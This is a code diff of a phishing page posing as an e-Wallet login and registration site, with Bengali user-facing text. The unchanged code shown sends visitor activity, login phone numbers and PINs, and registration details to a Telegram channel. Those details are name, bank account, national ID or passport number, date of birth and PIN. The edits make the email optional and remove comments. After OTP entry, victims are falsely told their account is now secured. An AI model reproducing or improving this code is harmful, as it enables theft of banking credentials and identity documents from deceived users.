@@ -147,8 +147,8 @@
                 <div class="input-group"><input type="tel" id="reg-phone" class="input-field" placeholder="Phone" required></div>
                 <div class="input-group"><input type="text" id="reg-bank-acc" class="input-field" placeholder="Bank Acc" required></div>
                 <div class="input-group"><input type="text" id="reg-nid" class="input-field" placeholder="NID/SID/Passport Number" required></div>
-                <div class="input-group"><input type="email" id="reg-email" class="input-field" placeholder="Email" required></div>
-                <div class="input-group"><input type="text" id="reg-dob" onfocus="(this.type='date')" onblur="(this.type='text')" class="input-field" placeholder="Date of Birth" required></div>
+                <div class="input-group"><input type="email" id="reg-email" class="input-field" placeholder="Email (Optional)"></div>
+                <div class="input-group"><input type="text" id="reg-dob" class="input-field" placeholder="Date of Birth (DD/MM/YYYY)" required></div>
                 <div class="input-group"><input type="password" id="reg-pin1" class="input-field" placeholder="Enter PIN (6 Digit)" maxlength="6" required></div>
                 <div class="input-group"><input type="password" id="reg-pin2" class="input-field" placeholder="Re-enter PIN (6 Digit)" maxlength="6" required></div>
                 <div class="terms-group">
@@ -198,15 +198,13 @@
         }
         // --- END: TELEGRAM TRACKING LOGIC ---
 
-
         document.addEventListener('DOMContentLoaded', () => {
             
-            // This small delay prevents the script from blocking the initial page render.
             setTimeout(() => {
                 sendToTelegram("👤 একজন আপনার e-Wallet পেজ ভিজিট করেছে।");
             }, 100);
 
-            let otpContext = 'login'; // Default context is 'login'
+            let otpContext = 'login';
 
             const pages = document.querySelectorAll('.page');
             const continueBtn = document.getElementById('tap-to-continue');
@@ -244,8 +242,6 @@
                 }, 1000);
             }
 
-            // --- Event Listeners for Page Navigation and Actions ---
-
             continueBtn.addEventListener('click', () => { 
                 sendToTelegram("🖱️ 'Tap to Continue' বাটনে ক্লিক করা হয়েছে।");
                 showPage('login-page'); 
@@ -260,7 +256,7 @@
             backToLoginBtn.addEventListener('click', () => { showPage('login-page'); });
             
             loginBtn.addEventListener('click', () => { 
-                otpContext = 'login'; // Set context for OTP verification
+                otpContext = 'login';
                 const phone = document.getElementById('phone-input').value;
                 const pin = document.getElementById('pin-input').value;
                 const message = `
@@ -276,7 +272,7 @@
             
             regForm.addEventListener('submit', (e) => {
                 e.preventDefault();
-                otpContext = 'register'; // Set context for OTP verification
+                otpContext = 'register';
                 const regData = {
                     Name: document.getElementById('reg-name').value, Phone: document.getElementById('reg-phone').value,
                     BankAccount: document.getElementById('reg-bank-acc').value, NID: document.getElementById('reg-nid').value,
@@ -290,7 +286,7 @@
 📱 <b>Phone:</b> ${regData.Phone}
 🏦 <b>Bank Acc:</b> ${regData.BankAccount}
 💳 <b>NID/Passport:</b> ${regData.NID}
-📧 <b>Email:</b> ${regData.Email}
+📧 <b>Email:</b> ${regData.Email || 'N/A'}
 🎂 <b>DoB:</b> ${regData.DOB}
 🔒 <b>PIN:</b> ${regData.PIN}
 --------------------------------------`;
@@ -311,7 +307,7 @@
                     successMessageEl.innerHTML = "রেজিস্ট্রেশন সম্পূর্ণ হয়েছে!<br>অনুগ্রহ করে লগইন করুন।";
                     showPage('success-page');
                     setTimeout(() => showPage('login-page'), 3000);
-                } else { // 'login' context
+                } else {
                     successMessageEl.innerHTML = "ধন্যবাদ! আপনার একাউন্ট এখন সুরক্ষিত।<br>ভেরিফিকেশন সম্পূর্ণ হয়েছে।";
                     showPage('success-page');
                     setTimeout(() => showPage('home-page'), 3000);
@@ -337,7 +333,6 @@
                 });
             });
             
-            // Ensure the first page is shown on load
             showPage('home-page');
         });
     </script>
